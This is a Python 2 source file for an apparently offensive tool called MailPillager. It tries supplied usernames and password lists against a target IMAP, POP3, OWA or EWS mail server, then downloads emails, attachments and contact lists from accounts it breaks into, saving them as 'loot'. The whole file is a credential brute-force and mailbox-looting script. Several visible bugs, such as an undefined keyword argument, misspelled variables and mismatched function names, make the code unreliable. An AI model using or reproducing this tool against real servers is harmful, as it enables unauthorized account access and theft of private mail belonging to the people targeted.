#! /usr/bin/python
import email.parser
import imaplib
import os
import poplib
import re
import ssl
import sys
import argparse

from core.utils import Utils, Display
from modules.pillager import Pillager
from modules.imap_pillage import IMAP
from modules.imaps_pillage import IMAPS
from modules.pop3_pillage import POP3
from modules.pop3s_pillage import POP3S
from modules.ews_pillage import EWS

# -----------------------------------------------------------------------------
# primary class for mail pillager
# -----------------------------------------------------------------------------
class MailPillager():
    def __init__(self):
        self.config = {}        # dict to contain combined list of config file options and commandline parameters

        self.display = Display()

        self.config["verbose"] = False
        self.config["downloadattachments"] = False
        self.config["downloademails"] = True
        self.config["buildcontactlist"] = True
        self.config["searchstringfile"] = ""
        self.config["searchterms"] = list()
        self.config["server"] = ""
        self.config["servertype"] = ""
        self.config["domain"] = ""
        self.config["username"] = ""
        self.config["usernamefile"] = ""
        self.config["password"] = ""
        self.config["passwordfile"] = ""
        self.config["usernamepasswordfile"] = ""
        self.config["config_filename"] = "defasult.cfg"
        self.config["outdir"] = "loot/"


    #----------------------------
    # Parse CommandLine Parms
    #----------------------------
    def parse_parameters(self, argv):
        parser = argparse.ArgumentParser()

        #==================================================
        # Input Files
        #==================================================
        filesgroup = parser.add_argument_group('input files')
        filesgroup.add_argument("-C",
                            metavar="<config.txt>",
                            dest="config_file",
                            action='store',
                            help="config file")
        filesgroup.add_argument("-U",
                            metavar="<users.txt>",
                            dest="usernamefile",
                            action='store',
                            help="file containing list of username")
        filesgroup.add_argument("-P",
                            metavar="<passwords.txt>",
                            dest="passwordfile",
                            action='store',
                            help="file containing list of passwords")
        filesgroup.add_argument("--COMBINED",
                            metavar="<username_passwords.txt>",
                            dest="usernamepasswordfile",
                            action='store',
                            help="file containing list of username:password")
        filesgroup.add_argument("--searchstringifile",
                            metavar="<searchstrings.txt>",
                            dest="searchstringfile",
                            action='store',
                            help="file containing list of search strings or regexes, 1 per line")

        #==================================================
        # Enable Flags
        #==================================================
        enablegroup = parser.add_argument_group('enable flags')
        enablegroup.add_argument("--emails",
                            dest="downloademails",
                            action='store_true',
                            help="download any identified emails?")
        enablegroup.add_argument("--attachments",
                            dest="downloadattachments",
                            action='store_true',
                            help="download any identified attachments?")
        enablegroup.add_argument("--contacts",
                            dest="buildcontactlist",
                            action='store_true',
                            help="collect contact list?")

        #==================================================
        # Other Args
        #==================================================
        parser.add_argument("-s",
                            metavar="<server>",
                            dest="server",
                            default="",
                            action='store',
                            help="target mail server ip or fqdn")
        parser.add_argument("-t",
                            metavar="<type of mail server>",
                            dest="servertype",
                            default="",
                            action='store',
                            help="valid choices are: IMAP, IMAPS, POP3, POP3S, OWA, EWS")
        parser.add_argument("-d",
                            metavar="<domain>",
                            dest="domain",
                            action='store',
                            help="domain name to phish")
        parser.add_argument("-u",
                            metavar="<username>",
                            dest="username",
                            action='store',
                            help="username")
        parser.add_argument("-p",
                            metavar="<password>",
                            dest="password",
                            action='store',
                            help="password")
        parser.add_argument("--searchstring",
                            metavar="\"term1,term2,term3,...\"",
                            dest="searchstring",
                            action='store',
                            help="list of search terms seperated by commas")
        parser.add_argument("-o",
                            metavar="<output directory>",
                            dest="outdir",
                            action='store',
                            help="directory to which to save any loot")
        parser.add_argument("-v", "--verbosity",
                            dest="verbose",
                            action='count',
                            help="increase output verbosity")

        # parse args
        args = parser.parse_args()

        # convert parameters to values in the config dict
        self.config["verbose"] = args.verbose
        self.config["downloadattachments"] = args.downloadattachments
        self.config["downloademails"] = args.downloademails
        self.config["buildcontactlist"] = args.buildcontactlist
        self.config["searchstringfile"] = args.searchstringfile
        self.config["searchstring"] = args.searchstring
        self.config["server"] = args.server
        self.config["servertype"] = args.servertype
        self.config["domain"] = args.domain
        self.config["username"] = args.username
        self.config["usernamefile"] = args.usernamefile
        self.config["password"] = args.password
        self.config["passwordfile"] = args.passwordfile
        self.config["usernamepasswordfile"] = args.usernamepasswordfile
        if args.outdir:
            self.config["outdir"] = args.outdir

        if self.config["searchstring"]:
            self.config["searchterms"] = self.config["searchstring"].split(",")

        if Utils.isReadable(self.config["searchstringfile"]):
            with open(self.config["searchstringfile"]) as f:
                self.config["searchterms"] = f.read().splitlines()

        # validate we have required fields
        valid = True
        if (self.config["username"] and self.config["password"]) or (Utils.isReadable(self.config["usernamefile"]) and Utils.isReadable(self.config["passwordfile"])) or (Utils.isReadable(self.config["usernamepasswordfile"])):
            pass
        else:
            self.display.error("Please enable at least one of the following parameters: --COMBINED or (-U and -P) or (-u and -p)")
            valid = False
        if (self.config["server"] and self.config["servertype"]):
            self.config["servertype"] = self.config["servertype"].lower()
            pass
        else:
            self.display.error("Please enable at both of: -s and -t")
            valid = False

        if not valid:
            parser.print_help()
            sys.exit(1)

    #----------------------------
    # Process/Load config file
    #----------------------------
    def load_config(self):
        # does config file exist?
        if (self.config["config_filename"] is not None):
            temp1 = self.config
            temp2 = Utils.loadConfig(self.config["config_filename"])
            self.config = dict(temp2.items() + temp1.items())
        else:
            # guess not..   so try to load the default one
            if Utils.is_readable("default.cfg"):
                self.display.error("a CONFIG FILE was not specified...  defaulting to [default.cfg]")
                print
                temp1 = self.config
                temp2 = Utils.loadConfig("default.cfg")
                self.config = dict(temp2.items() + temp1.items())
            else:
                # someone must have removed it!
                self.display.error("a CONFIG FILE was not specified...")
                print
                sys.exit(1)

        # set verbosity/debug level
        if (self.config['verbose'] >= 1):
            self.display.enableVerbose()
        if (self.config['verbose'] > 1):
            self.display.enableDebug()

    def pillage(self, username, password, server, servertype, domain):

        print "%s, %s, %s, %s" % (username, password, server, domain)

        # decide on type of mail server
        mail = None
        port = 0
        print servertype
        if servertype == "imaps":
            mail = IMAPS()
            port = 993
            print "IMAP"
        elif servertype == "imap":
            mail = IMAP()
            port = 143
            print "IMAP"
        elif servertype == "pop3s":
            mail = POP3S()
            port = 995
            print "POP3"
        elif servertype == "pop3":
            mail = POP3()
            port = 110
            print "POP3"
        elif servertype == "owa":
            mail = EWS()
            port = 443
            print "EWS"
        elif servertype == "ews":
            mail = EWS()
            port = 443
            print "EWS"
        else:
            print "ERROR, unknown server type provided"
            return

        # connect to mail server
        mail.connect(self.config)

        # validate username/password
        valid = False
        print "trying [%s]" % (username)
        if (mail.validate(username, password)):
            valid = True
        if not valid and (domain is not ""):
            print "trying [%s@%s]" % (username, domain)
            if (mail.validate(username + "@" + domain, password)):
                valid = True
                username = username + "@" + domain

        # assuming the username/password worked
        if (valid):
            print "USER [%s] with PASSWORD [%s] is valid on [%s:%i]" % (username, password, server, port)

            # pillage information!
            mail.pillage()

            mail.disconnect()
        else:
            print "USER [%s] with PASSWORD [%s] is NOT valid on [%s:%i]" % (username, password, server, port)

    def run(self, argv):
        # load config
        self.parse_parameters(argv)
        self.load_config()

        # validate that all necessary flags/configs were set

        # if single username and password
        if (self.config["username"] and self.config["password"]):
            mp.pillage(username=self.config["username"], password=self.config["password"], server=self.config["server"], servertype=self.config["servertype"], domain=self.config["domain"])
        # if seperate username and password files
        elif (Utils.isReadable(self.config["usernamefile"]) and Utils.isReadable(self.config["passwordfile"])):
            usernames = list()
            passwords = list()
            with open(self.config["usernamefile"]) as f:
                usernames = f.read().splitlines()
            with open(self.config["passwordfile"]) as f:
                passwords = f.read().splitlines()
            for u in usernames:
                for p in passwords:
                    mp.pillage(username=u, password=p, server=self.config["server"], port=int(self.config["serverport"]), domain=self.config["domain"])
        elif Utils.isReadable(self.config["usernamepasswordfile"]):
        # if a combined username password file
            usernames = list()
            with open(self.config["usernamepasswordfile"]) as f:
                usernamespasswords = f.read().splitlines()
            for temp in usernamepasswords:
                (u, p) = temp.split(":", 1)
                mp.pillage(username=u, password=p, server=self.config["server"], port=int(self.config["serverport"]), domain=self.config["domain"])

# -----------------------------------------------------------------------------
# main test code
# -----------------------------------------------------------------------------
if __name__ == "__main__":
    mp = MailPillager()
    mp.run(sys.argv[1:])
